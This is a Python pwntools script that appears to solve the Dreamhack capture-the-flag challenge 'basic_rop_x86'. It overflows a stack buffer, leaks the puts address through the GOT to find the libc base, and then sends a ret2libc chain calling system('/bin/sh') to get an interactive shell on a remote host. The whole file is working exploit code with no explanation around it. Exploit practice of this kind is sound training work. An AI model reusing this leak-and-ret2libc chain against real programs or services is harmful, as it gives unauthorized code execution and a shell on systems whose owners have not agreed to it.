#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('basic_rop_x86_patched', checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

gs = """
b *main
b *main+56
b *main+72
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 24263)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})
    
puts_got = p32(elf.got['puts'])
puts_plt = p32(elf.plt['puts'])
main = p32(elf.sym['main'])
popebp_ret = pack(0x0804868b)
leak = b'a' * 0x48 + puts_plt + popebp_ret + puts_got + main 

io = start()
sl(leak)
io.recvuntil(b'a' * 0x40)
puts = u32(io.recvn(4))
libc.address = puts - libc.sym['puts']
success(f"puts @ {hex(puts)}")
success(f"libc @ {hex(libc.address)}")

system = pack(libc.symbols['system'])
binsh = pack(next(libc.search(b'/bin/sh\x00')))
payload  = b'a' * 0x48 + system + popebp_ret + binsh 
sl(payload)
io.interactive()
